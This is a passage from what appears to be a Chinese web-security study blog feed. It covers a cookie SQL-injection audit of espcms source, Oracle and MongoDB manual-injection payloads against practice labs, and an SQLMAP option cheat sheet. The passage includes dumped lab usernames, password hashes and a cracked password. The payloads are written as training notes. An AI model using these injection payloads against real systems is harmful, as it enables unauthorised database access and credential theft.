UM_distinctid=186cfa9dc6a710-0dcbfdf03f31a98-d555429-144000-186cfa9dc6b1227; CNZZDATA1277915428=1687386700-1571722458-http%253A%252F%252F127.0.0.1%252F%7C1571722458; Gpa6_2132_logintime=1678521459; security=low; PHPSESSID=a8b34abadc72da74fe40f008862b775e; thinkphp_show_page_trace=0|0</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">admin=ad&amp;pass=123&amp;yzm=8&amp;Submit=%E7%99%BB+%E5%BD%95</span></span><br></pre></td></tr></table></figure><h1 id="黑白盒测试-Cookie注入"><a href="#黑白盒测试-Cookie注入" class="headerlink" title="黑白盒测试-Cookie注入"></a>黑白盒测试-Cookie注入</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">测试环境：php5.<span class="number">3</span></span><br><span class="line">测试目标：espcms_utf8_5.<span class="number">5.12</span>.<span class="number">10.08</span></span><br><span class="line">测试目的：使用COOKIE进行注入</span><br><span class="line"></span><br><span class="line">产生COOKIE漏洞的原因：  </span><br><span class="line">upload\<span class="class"><span class="keyword">interface</span>\<span class="title">order</span>.<span class="title">php</span>文件下：</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">in_list</span>() </span>&#123;</span><br><span class="line">    <span class="built_in">parent</span>::<span class="title function_ invoke__">start_pagetemplate</span>();</span><br><span class="line">    <span class="variable">$lng</span> = (admin_LNG == <span class="string">&#x27;big5&#x27;</span>) ? <span class="variable language_">$this</span>-&gt;CON[<span class="string">&#x27;is_lancode&#x27;</span>] : admin_LNG;</span><br><span class="line">    <span class="variable">$cartid</span> = <span class="variable language_">$this</span>-&gt;fun-&gt;<span class="title function_ invoke__">accept</span>(<span class="string">&#x27;ecisp_order_list&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    <span class="variable">$cartid</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="title function_ invoke__">htmlspecialchars_decode</span>(<span class="variable">$cartid</span>));</span><br><span class="line">    <span class="variable">$uncartid</span> = !<span class="keyword">empty</span>(<span class="variable">$cartid</span>) ? <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cartid</span>) : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$uncartid</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$uncartid</span>)) &#123;</span><br><span class="line">        <span class="variable">$didarray</span> = <span class="variable language_">$this</span>-&gt;fun-&gt;<span class="title function_ invoke__">key_array_name</span>(<span class="variable">$uncartid</span>, <span class="string">&#x27;did&#x27;</span>, <span class="string">&#x27;amount&#x27;</span>);</span><br><span class="line">        <span class="variable">$didlist</span> = <span class="variable language_">$this</span>-&gt;fun-&gt;<span class="title function_ invoke__">format_array_text</span>(<span class="title function_ invoke__">array_keys</span>(<span class="variable">$didarray</span>), <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$didlist</span>)) &#123;</span><br><span class="line">            <span class="variable">$db_table</span> = db_prefix . <span class="string">&#x27;document&#x27;</span>;</span><br><span class="line">            <span class="variable">$db_where</span> = <span class="string">&quot;isclass=1 AND isorder=1 AND did in(<span class="subst">$didlist</span>) ORDER BY did DESC&quot;</span>;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,</span></span><br><span class="line"><span class="string">                color,author,source,pic,link,oprice,bprice,click,addtime,template,filename,filepath FROM <span class="subst">$db_table</span> WHERE <span class="subst">$db_where</span>&quot;</span>;</span><br><span class="line">            <span class="variable">$rs</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$productmoney</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$rsList</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">fetch_assoc</span>(<span class="variable">$rs</span>)) &#123;</span><br><span class="line">                <span class="variable">$rsList</span>[<span class="string">&#x27;link&#x27;</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_link</span>(<span class="string">&#x27;doc&#x27;</span>, <span class="variable">$rsList</span>, admin_LNG);</span><br><span class="line">                <span class="variable">$rsList</span>[<span class="string">&#x27;buylink&#x27;</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_link</span>(<span class="string">&#x27;buylink&#x27;</span>, <span class="variable">$rsList</span>, admin_LNG);</span><br><span class="line">                <span class="variable">$rsList</span>[<span class="string">&#x27;enqlink&#x27;</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_link</span>(<span class="string">&#x27;enqlink&#x27;</span>, <span class="variable">$rsList</span>, admin_LNG);</span><br><span class="line"></span><br><span class="line">                <span class="variable">$rsList</span>[<span class="string">&#x27;dellink&#x27;</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_link</span>(<span class="string">&#x27;buydel&#x27;</span>, <span class="variable">$rsList</span>, admin_LNG);</span><br><span class="line">                <span class="variable">$rsList</span>[<span class="string">&#x27;ctitle&#x27;</span>] = <span class="keyword">empty</span>(<span class="variable">$rsList</span>[<span class="string">&#x27;color&#x27;</span>]) ? <span class="variable">$rsList</span>[<span class="string">&#x27;title&#x27;</span>] : <span class="string">&quot;&lt;font color=&#x27;&quot;</span> . <span class="variable">$rsList</span>[<span class="string">&#x27;color&#x27;</span>] . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$rsList</span>[<span class="string">&#x27;title&#x27;</span>] . <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">                <span class="variable">$rsList</span>[<span class="string">&#x27;amount&#x27;</span>] = <span class="variable">$didarray</span>[<span class="variable">$rsList</span>[<span class="string">&#x27;did&#x27;</span>]];</span><br><span class="line"></span><br><span class="line">                <span class="variable">$countprice</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%01.2f&quot;</span>, <span class="variable">$didarray</span>[<span class="variable">$rsList</span>[<span class="string">&#x27;did&#x27;</span>]] * <span class="variable">$rsList</span>[<span class="string">&#x27;bprice&#x27;</span>]);</span><br><span class="line">                <span class="variable">$rsList</span>[<span class="string">&#x27;countprice&#x27;</span>] = <span class="variable">$countprice</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$productmoney</span> = <span class="variable">$productmoney</span> + <span class="variable">$countprice</span>;</span><br><span class="line">                <span class="variable">$array</span>[] = <span class="variable">$rsList</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fun-&gt;<span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;ecisp_order_productmoney&#x27;</span>, <span class="variable">$productmoney</span>, <span class="number">7200</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pagetemplate-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;ordertotal&#x27;</span>, <span class="title function_ invoke__">number_format</span>(<span class="variable">$productmoney</span>, <span class="number">2</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pagetemplate-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;array&#x27;</span>, <span class="variable">$array</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$order_integral</span> = <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;CON[<span class="string">&#x27;order_integral&#x27;</span>]) ? <span class="number">1</span> : <span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;CON[<span class="string">&#x27;order_integral&#x27;</span>]);</span><br><span class="line">        <span class="variable">$internum</span> = <span class="variable">$productmoney</span> * <span class="variable">$order_integral</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pagetemplate-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;internum&#x27;</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$internum</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pagetemplate-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;moneytype&#x27;</span>, <span class="variable">$this</span>-&gt;CON[<span class="string">&#x27;order_moneytype&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pagetemplate-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;ordervirtue&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;pagetemplate-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;mlink&#x27;</span>, <span class="variable">$this</span>-&gt;mlink);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$templatesDIR</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_templatesdir</span>(<span class="string">&#x27;order&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;pagetemplate-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;order&#x27;</span>);</span><br><span class="line">    <span class="variable">$templatefilename</span> = <span class="variable">$lng</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$templatesDIR</span> . <span class="string">&#x27;/order_buy_center&#x27;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;pagetemplate-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;out&#x27;</span>, <span class="string">&#x27;buylist&#x27;</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$array</span>, <span class="variable language_">$this</span>-&gt;mlink, <span class="variable">$LANPACK</span>, <span class="variable language_">$this</span>-&gt;lng);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;pagetemplate-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$templatefilename</span>, <span class="string">&#x27;order_list&#x27;</span>, <span class="literal">false</span>, <span class="string">&#x27;&#x27;</span>, admin_LNG);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    定位出这行执行行：</span><br><span class="line">    <span class="variable">$cartid</span> = <span class="variable language_">$this</span>-&gt;fun-&gt;<span class="title function_ invoke__">accept</span>(<span class="string">&#x27;ecisp_order_list&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line"></span><br><span class="line">将源码放入Seay项目审计系统，定位accept： </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">accept</span>(<span class="params"><span class="variable">$k</span>, <span class="variable">$var</span>=<span class="string">&#x27;R&#x27;</span>, <span class="variable">$ectype</span>=<span class="string">&#x27;bu&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$var</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">            <span class="variable">$var</span> = &amp;<span class="variable">$_GET</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line">            <span class="variable">$var</span> = &amp;<span class="variable">$_POST</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">            <span class="variable">$var</span> = &amp;<span class="variable">$_COOKIE</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">            <span class="variable">$var</span> = &amp;<span class="variable">$_REQUEST</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$vluer</span> = <span class="variable">$var</span>[<span class="variable">$k</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$vluer</span>) ? <span class="title function_ invoke__">daddslashes</span>(<span class="variable">$vluer</span>, <span class="number">1</span>) : <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">证明accept是用来获取cookie的，上面截取出来的这个就是获取代码</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">        <span class="variable">$var</span> = &amp;<span class="variable">$_COOKIE</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">源代码上的漏洞分两组情况</span><br><span class="line">    <span class="number">1</span>.写代码(一定执行)</span><br><span class="line">    <span class="number">2</span>.写函数(不一定执行，需要找到带有此函数执行的页面)</span><br><span class="line"></span><br><span class="line">上面是属于在函数的情况，需要找到使用这个函数的源代码</span><br><span class="line">全局搜索<span class="title function_ invoke__">in_list</span>()这个函数在哪个文件被调用、包含，声明的文件全部不算。</span><br><span class="line"></span><br><span class="line">找不到对函数的直接调用，就找它的上一级，定义这个函数的方法(<span class="class"><span class="keyword">class</span>):<span class="title">mainpage</span> </span></span><br><span class="line"><span class="class">    ==&gt; 原因：函数的名字被拆解了，属于组合后实现函数效果的那种</span></span><br><span class="line"><span class="class">全局搜索 <span class="title">new</span> <span class="title">mainpage</span> 找到对它的调用</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">index</span>.<span class="title">php</span>下：</span></span><br><span class="line"><span class="class">$<span class="title">archive</span> = <span class="title">indexget</span>(&#x27;<span class="title">ac</span>&#x27;, &#x27;<span class="title">R</span>&#x27;);</span></span><br><span class="line"><span class="class">$<span class="title">action</span> = <span class="title">indexget</span>(&#x27;<span class="title">at</span>&#x27;, &#x27;<span class="title">R</span>&#x27;); // <span class="title">at</span>接收</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span> (<span class="title">empty</span>($<span class="title">archive</span>) || <span class="title">empty</span>($<span class="title">action</span>)) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span> admin_ROOT . <span class="string">&#x27;interface/public.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$mainlist</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mainpage</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$mainlist</span>, <span class="string">&#x27;in_index&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$mainlist</span>-&gt;<span class="title function_ invoke__">in_index</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;Access error!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$archive</span>, <span class="keyword">array</span>(<span class="string">&#x27;article&#x27;</span>, <span class="string">&#x27;forum&#x27;</span>, <span class="string">&#x27;search&#x27;</span>, <span class="string">&#x27;bbssearch&#x27;</span>, <span class="string">&#x27;forummain&#x27;</span>, <span class="string">&#x27;messmain&#x27;</span>, <span class="string">&#x27;special&#x27;</span>, <span class="string">&#x27;respond&#x27;</span>, <span class="string">&#x27;public&#x27;</span>, <span class="string">&#x27;scriptout&#x27;</span>, <span class="string">&#x27;enquiry&#x27;</span>, <span class="string">&#x27;enquirymain&#x27;</span>, <span class="string">&#x27;form&#x27;</span>, <span class="string">&#x27;formmain&#x27;</span>, <span class="string">&#x27;ordermain&#x27;</span>, <span class="string">&#x27;membermain&#x27;</span>, <span class="string">&#x27;member&#x27;</span>, <span class="string">&#x27;forum&#x27;</span>, <span class="string">&#x27;order&#x27;</span>))) &#123;</span><br><span class="line">        <span class="variable">$action</span> = <span class="string">&#x27;in_&#x27;</span> . <span class="variable">$action</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(admin_ROOT . <span class="string">&quot;interface/<span class="subst">$archive</span>.php&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;Access error!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span> admin_ROOT . <span class="string">&quot;interface/<span class="subst">$archive</span>.php&quot;</span>;</span><br><span class="line">        <span class="variable">$mainlist</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mainpage</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$mainlist</span>, <span class="variable">$action</span>)) &#123;</span><br><span class="line">            <span class="variable">$mainlist</span>-&gt;<span class="variable">$action</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;Access error!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;Access error!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-------------</span><br><span class="line">分析：</span><br><span class="line"><span class="variable">$action</span> = <span class="title function_ invoke__">indexget</span>(<span class="string">&#x27;at&#x27;</span>, <span class="string">&#x27;R&#x27;</span>); <span class="comment">// at接收，如果at是order时：</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="string">&#x27;in_&#x27;</span> . <span class="variable">$action</span>; <span class="comment">// 这个将变成in_order，也就是我们需要的那个函数的函数名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">==&gt; 最后是在cookie进行注入</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>数据库类型决定攻击的手法—payload不一样<br>数据类型注入 — payload考虑闭合–数据格式<br>提交方式-数据请求不同–注入需要按照指定方式去测试</p><blockquote><p>告诉我们url没有参数并不代表没有注入，有些数据会在数据包才有所体现<br>告诉我们HTTP数据包任何一个1地方只要被接收，就有可能产生漏洞</p></blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
            <tag> tool </tag>
            
            <tag> SQLMAP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0017-WEB攻防-08-通用漏洞之SQL数据库-Oracle/Mongodb/SQLMAP</title>
      <link href="/2023/05/20/SEC-Study-0045/"/>
      <url>/2023/05/20/SEC-Study-0045/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>1、数据库注入-Oracle&amp;Mongodb<br>2、数据库注入-DB2&amp;SQLite&amp;Sybase<br>3、SQL注入神器-SQLMAP安装使用拓展</p><h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">参考：https:<span class="comment">//www.cnblogs.com/peterpan0707007/p/8242119.html</span></span><br><span class="line">墨者靶场：SQL手工注入漏洞测试(Oracle数据库)</span><br><span class="line">    注入点位置：数据库登陆页面下的那个展示公告的地方，点进去会出现类似于公告的展示页面</span><br><span class="line">    测回显：</span><br><span class="line">        <span class="string">&quot; dual &quot;</span> 并不是一个特定的数据库或数据表，它实际上是 Oracle 数据库系统中的一种虚拟表。</span><br><span class="line">        在 Oracle 数据库中，dual 表是一个特殊的只读表，通常用于执行一些简单的测试或计算。人称凑数表。</span><br><span class="line">        <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span> <span class="keyword">from</span> dual</span><br><span class="line">    爆库：</span><br><span class="line">        select table_name <span class="keyword">from</span> user_tables：从user_tables表取出table_name列的值</span><br><span class="line">        rownum=<span class="number">1</span> ：限制结果集只返回前一行</span><br><span class="line">        <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="string">&#x27;1&#x27;</span>,(select table_name <span class="keyword">from</span> user_tables where rownum=<span class="number">1</span>) <span class="keyword">from</span> dual</span><br><span class="line">    模糊爆库：</span><br><span class="line">        like <span class="string">&#x27;%user%&#x27;</span>:模糊查询存在<span class="string">&#x27;user&#x27;</span>字段的值。</span><br><span class="line">        <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="string">&#x27;1&#x27;</span>,(select table_name <span class="keyword">from</span> user_tables where rownum=<span class="number">1</span> <span class="keyword">and</span> table_name like <span class="string">&#x27;%user%&#x27;</span>) <span class="keyword">from</span> dual</span><br><span class="line">    爆列名：</span><br><span class="line">        找出<span class="string">&#x27;sns_users&#x27;</span>表的列名值 =&gt; user_name</span><br><span class="line">        <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="string">&#x27;1&#x27;</span>,(select column_name <span class="keyword">from</span> all_tab_columns where rownum=<span class="number">1</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;sns_users&#x27;</span>) <span class="keyword">from</span> dual</span><br><span class="line">    爆其他列名：</span><br><span class="line">        使用排除法爆破其它列名：column_name not <span class="title function_ invoke__">in</span> (<span class="string">&#x27;USER_NAME&#x27;</span>) =&gt; user_pwd</span><br><span class="line">        <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="string">&#x27;1&#x27;</span>,(select column_name <span class="keyword">from</span> all_tab_columns where rownum=<span class="number">1</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;sns_users&#x27;</span> <span class="keyword">and</span> column_name not <span class="title function_ invoke__">in</span> (<span class="string">&#x27;USER_NAME&#x27;</span>)) <span class="keyword">from</span> dual</span><br><span class="line">    爆数据：</span><br><span class="line">        <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select user_name,user_pwd <span class="keyword">from</span> <span class="string">&quot;sns_users&quot;</span></span><br><span class="line">        爆出：hu <span class="number">1</span>c63129ae9db9g20asdua94d3e00495</span><br><span class="line">    爆其他数据：</span><br><span class="line">        用户名不是“hu”的数据：USER_NAME&lt;&gt;<span class="string">&#x27;hu&#x27;</span></span><br><span class="line">        可以通过这种方式不断筛选用户名数据</span><br><span class="line">        <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select user_name,user_pwd <span class="keyword">from</span> <span class="string">&quot;sns_users&quot;</span> where USER_NAME&lt;&gt;<span class="string">&#x27;hu&#x27;</span></span><br><span class="line">        爆出：mozhe <span class="number">8</span>b4353daf4ec0978f2f1114e13ce29bd ==md5解密=&gt; <span class="number">997528</span></span><br><span class="line">        成功登陆后的KEY：mozhe03f97d23df406288242ba951273</span><br></pre></td></tr></table></figure><h2 id="Mongodb-看代码-gt-Python常用的数据库"><a href="#Mongodb-看代码-gt-Python常用的数据库" class="headerlink" title="Mongodb 看代码 =&gt; Python常用的数据库"></a>Mongodb 看代码 =&gt; Python常用的数据库</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">参考：https:<span class="comment">//www.runoob.com/mongodb/mongodb-query.html</span></span><br><span class="line">墨者靶场:SQL手工注入漏洞测试(MongoDB数据库)</span><br><span class="line">    需要源码</span><br><span class="line">    select * <span class="keyword">from</span> news where id=(&#123;<span class="string">&#x27;$a&#x27;</span>&#125;) =&gt; 注入时需要考虑将前面的符号闭合完整 </span><br><span class="line">    =&gt; 注入</span><br><span class="line">    测回显：</span><br><span class="line">        /new_list.php?id=<span class="number">1</span><span class="string">&#x27;&#125;); return (&#123;title:1,content:&#x27;</span><span class="number">2</span></span><br><span class="line">    爆库：  </span><br><span class="line">        db:代表当前数据库</span><br><span class="line">        /new_list.php?id=<span class="number">1</span><span class="string">&#x27;&#125;); return (&#123;title:tojson(db),content:&#x27;</span><span class="number">1</span></span><br><span class="line">    爆表： </span><br><span class="line">        /new_list.php?id=<span class="number">1</span><span class="string">&#x27;&#125;); return (&#123;title:tojson(db.getCollectionNames()),content:&#x27;</span><span class="number">1</span>  </span><br><span class="line">    爆字段：</span><br><span class="line">        /new_list.php?id=<span class="number">1</span><span class="string">&#x27;&#125;); return (&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#x27;</span><span class="number">1</span></span><br><span class="line">    db.<span class="title function_ invoke__">getCollectionNames</span>()   返回的是数组，需要用tojson转换为字符串。db下的表名</span><br><span class="line">    db.Authority_confidential 是当前用的集合（表），find函数用于查询，<span class="number">0</span>是第一条数据</span><br></pre></td></tr></table></figure><h1 id="SQLMAP工具注入"><a href="#SQLMAP工具注入" class="headerlink" title="SQLMAP工具注入"></a>SQLMAP工具注入</h1><p>如果怕封，就换代理。</p><h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><ul><li>什么是SQLMAP？</li><li>它支持那些数据库注入？</li><li>它支持那些SQL注入模式？</li><li>它支持那些其他不一样功能？</li><li>使用SQLMAP一般注入流程分析？<ul><li>看库：首先看清楚当前注入的数据库类型</li><li>看权限：此类型是否存在高低权限</li><li>看为什么存在注入点无法注入，是否需要什么参数或者修正什么的</li></ul></li></ul><p><img src="image.png" alt="SQLMAP"></p><h2 id="SQLMAP使用"><a href="#SQLMAP使用" class="headerlink" title="SQLMAP使用"></a>SQLMAP使用</h2><p>1、判断数据库注入点（使用-u）<br>2、判断注入点权限（使用参数查看权限）</p><ul><li>sqlmap 数据库注入数据猜解</li><li>sqlmap 高权限注入读写执行</li><li>sqlmao 高权限注入联动MSF</li></ul><p>适用于手工注入的方式：union查询注入</p><h3 id="SQLMAP使用参数："><a href="#SQLMAP使用参数：" class="headerlink" title="SQLMAP使用参数："></a>SQLMAP使用参数：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">参考：https:<span class="comment">//www.cnblogs.com/bmjoker/p/9326258.html</span></span><br><span class="line"></span><br><span class="line">--purge <span class="comment">#清除缓存</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">基本操作笔记：</span><br><span class="line">-u     <span class="comment">#注入点 </span></span><br><span class="line">-f     <span class="comment">#指纹判别数据库类型 </span></span><br><span class="line">-b     <span class="comment">#获取数据库版本信息 </span></span><br><span class="line">-p     <span class="comment">#指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span></span><br><span class="line">-D <span class="string">&quot;&quot;</span>  <span class="comment">#指定数据库名 </span></span><br><span class="line">-T <span class="string">&quot;&quot;</span>  <span class="comment">#指定表名 </span></span><br><span class="line">-C <span class="string">&quot;&quot;</span>  <span class="comment">#指定字段 </span></span><br><span class="line">-s <span class="string">&quot;&quot;</span>  <span class="comment">#保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) </span></span><br><span class="line"></span><br><span class="line">--level=(<span class="number">1</span>-<span class="number">5</span>) <span class="comment">#要执行的测试水平等级，默认为1 </span></span><br><span class="line">--risk=(<span class="number">0</span>-<span class="number">3</span>)  <span class="comment">#测试执行的风险等级，默认为1 </span></span><br><span class="line">--time-sec=(<span class="number">2</span>,<span class="number">5</span>) <span class="comment">#延迟响应，默认为5 </span></span><br><span class="line">--data <span class="comment">#通过POST发送数据 </span></span><br><span class="line"></span><br><span class="line">--columns        <span class="comment">#列出字段 </span></span><br><span class="line">--current-user   <span class="comment">#获取当前用户名称 </span></span><br><span class="line">--current-db     <span class="comment">#获取当前数据库名称 </span></span><br><span class="line">--users          <span class="comment">#列数据库所有用户 </span></span><br><span class="line">--passwords      <span class="comment">#数据库用户所有密码 </span></span><br><span class="line">--privileges     <span class="comment">#查看用户权限(--privileges -U root) </span></span><br><span class="line">-U               <span class="comment">#指定数据库用户 </span></span><br><span class="line">--dbs            <span class="comment">#列出所有数据库 </span></span><br><span class="line"></span><br><span class="line">--tables -D <span class="string">&quot;&quot;</span>   <span class="comment">#列出指定数据库中的表 </span></span><br><span class="line">--columns -T <span class="string">&quot;user&quot;</span> -D <span class="string">&quot;mysql&quot;</span>      <span class="comment">#列出mysql数据库中的user表的所有字段 </span></span><br><span class="line">--dump-all            <span class="comment">#列出所有数据库所有表 </span></span><br><span class="line">--exclude-sysdbs      <span class="comment">#只列出用户自己新建的数据库和表 </span></span><br><span class="line">--dump -T <span class="string">&quot;&quot;</span> -D <span class="string">&quot;&quot;</span> -C <span class="string">&quot;&quot;</span>   <span class="comment">#列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span></span><br><span class="line">--dump -T <span class="string">&quot;&quot;</span> -D <span class="string">&quot;&quot;</span> --start <span class="number">2</span> --top <span class="number">4</span>  <span class="comment"># 列出指定数据库的表的2-4字段的数据 </span></span><br><span class="line">--dbms    <span class="comment">#指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span></span><br><span class="line">--os      <span class="comment">#指定系统(Linux,Windows) </span></span><br><span class="line">-v  <span class="comment">#详细的等级(0-6) </span></span><br><span class="line">    <span 